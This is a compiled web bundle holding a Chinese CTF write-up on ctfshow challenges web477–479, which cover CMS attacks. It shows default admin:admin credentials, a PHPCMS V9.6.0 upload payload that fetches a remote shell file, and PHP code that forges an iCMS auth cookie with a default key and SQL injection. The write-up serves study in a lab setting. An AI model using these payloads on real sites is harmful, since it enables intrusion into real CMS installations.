"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4777],{1280:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>a,contentTitle:()=>o,default:()=>$,frontMatter:()=>c,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow-cms","title":"ctfshow-cms","description":"web477","source":"@site/docs/CTF/CTFSHOW/ctfshow-cms.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow-cms","permalink":"/docs/CTF/CTFSHOW/ctfshow-cms","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow-cms.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024","permalink":"/docs/CTF/CTFSHOW/CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024"},"next":{"title":"ctfshow-java","permalink":"/docs/CTF/CTFSHOW/ctfshow-java"}}');var s=r(4848),i=r(8453);const c={},o=void 0,a={},d=[{value:"web477",id:"web477",level:3},{value:"CmsEasy \u547d\u4ee4\u6267\u884c",id:"cmseasy-\u547d\u4ee4\u6267\u884c",level:4},{value:"web478",id:"web478",level:3},{value:"PHPCMS V9.6.0 \u6587\u4ef6\u4e0a\u4f20",id:"phpcms-v960-\u6587\u4ef6\u4e0a\u4f20",level:4},{value:"web479",id:"web479",level:3},{value:"iCMS-7.0.1\u540e\u53f0\u767b\u5f55\u7ed5\u8fc7\u5206\u6790",id:"icms-701\u540e\u53f0\u767b\u5f55\u7ed5\u8fc7\u5206\u6790",level:4}];function l(e){const n={blockquote:"blockquote",code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h3,{id:"web477",children:"web477"}),"\n",(0,s.jsx)(n.h4,{id:"cmseasy-\u547d\u4ee4\u6267\u884c",children:"CmsEasy \u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsx)(n.p,{children:"/admin\u540e\u53f0\u7ba1\u7406"}),"\n",(0,s.jsxs)(n.p,{children:["\u5f31\u5bc6\u7801",(0,s.jsx)(n.code,{children:"admin:admin"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607140224725.png",alt:"image-20240607140224725"})}),"\n",(0,s.jsx)(n.p,{children:"\u7f16\u8f91\u4e00\u4e2a\u81ea\u5b9a\u4e49\u6807\u7b7e\uff0c\u9884\u89c8\u5c31\u53ef\u4ee5\u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"/index.php?case=templatetag&act=test&id=25\n"})}),"\n",(0,s.jsx)(n.h3,{id:"web478",children:"web478"}),"\n",(0,s.jsx)(n.h4,{id:"phpcms-v960-\u6587\u4ef6\u4e0a\u4f20",children:"PHPCMS V9.6.0 \u6587\u4ef6\u4e0a\u4f20"}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee/install/install.php\u5b89\u88c5cms"}),"\n",(0,s.jsx)(n.p,{children:"\u6ce8\u518c\u754c\u9762\u5e26\u751f\u65e5\u9009\u9879\u7684\u53ef\u4ee5\u5229\u7528"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607141010663.png",alt:"image-20240607141010663"})}),"\n",(0,s.jsx)(n.p,{children:"payload"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"siteid=1&modelid=11&username=test442&password=test2123&email=test21154@163.com&info[content]=<img src=http://ip/shell.txt?.php#.jpg>&dosubmit=1&protocol=\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607140916790.png",alt:"image-20240607140916790"})}),"\n",(0,s.jsx)(n.h3,{id:"web479",children:"web479"}),"\n",(0,s.jsx)(n.h4,{id:"icms-701\u540e\u53f0\u767b\u5f55\u7ed5\u8fc7\u5206\u6790",children:"iCMS-7.0.1\u540e\u53f0\u767b\u5f55\u7ed5\u8fc7\u5206\u6790"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u9ed8\u8ba4key",":n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk"]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"<?php\r\n//error_reporting(0);\r\nfunction urlsafe_b64decode($input){\r\n    $remainder = strlen($input) % 4;\r\n    if ($remainder) {\r\n        $padlen = 4 - $remainder;\r\n        $input .= str_repeat('=', $padlen);\r\n    }\r\n    return base64_decode(strtr($input, '-_!', '+/%'));\r\n}\r\n\r\nfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\r\n    $ckey_length   = 8;\r\n    $key           = md5($key ? $key : iPHP_KEY);\r\n    $keya          = md5(substr($key, 0, 16));\r\n    $keyb          = md5(substr($key, 16, 16));\r\n    $keyc          = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\r\n\r\n    $cryptkey      = $keya.md5($keya.$keyc);\r\n    $key_length    = strlen($cryptkey);\r\n\r\n    $string        = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\r\n    $string_length = strlen($string);\r\n\r\n    $result        = '';\r\n    $box           = range(0, 255);\r\n\r\n    $rndkey        = array();\r\n    for($i = 0; $i <= 255; $i++) {\r\n        $rndkey[$i] = ord($cryptkey[$i % $key_length]);\r\n    }\r\n\r\n    for($j = $i = 0; $i < 256; $i++) {\r\n        $j       = ($j + $box[$i] + $rndkey[$i]) % 256;\r\n        $tmp     = $box[$i];\r\n        $box[$i] = $box[$j];\r\n        $box[$j] = $tmp;\r\n    }\r\n\r\n    for($a = $j = $i = 0; $i < $string_length; $i++) {\r\n        $a       = ($a + 1) % 256;\r\n        $j       = ($j + $box[$a]) % 256;\r\n        $tmp     = $box[$a];\r\n        $box[$a] = $box[$j];\r\n        $box[$j] = $tmp;\r\n        $result  .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\r\n    }\r\n\r\n    if($operation == 'DECODE') {\r\n        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\r\n            return substr($result, 26);\r\n        } else {\r\n            return '';\r\n        }\r\n    } else {\r\n        return $keyc.str_replace('=', '', base64_encode($result));\r\n    }\r\n}\r\n\r\necho \"iCMS_iCMS_AUTH=\".urlencode(authcode(\"'or 1=1##=iCMS[192.168.0.1]=#1\",\"ENCODE\",\"n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk\"));\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240607124845435.png",alt:"image-20240607124845435"})})]})}function $(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>c,x:()=>o});var t=r(6540);const s={},i=t.createContext(s);function c(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);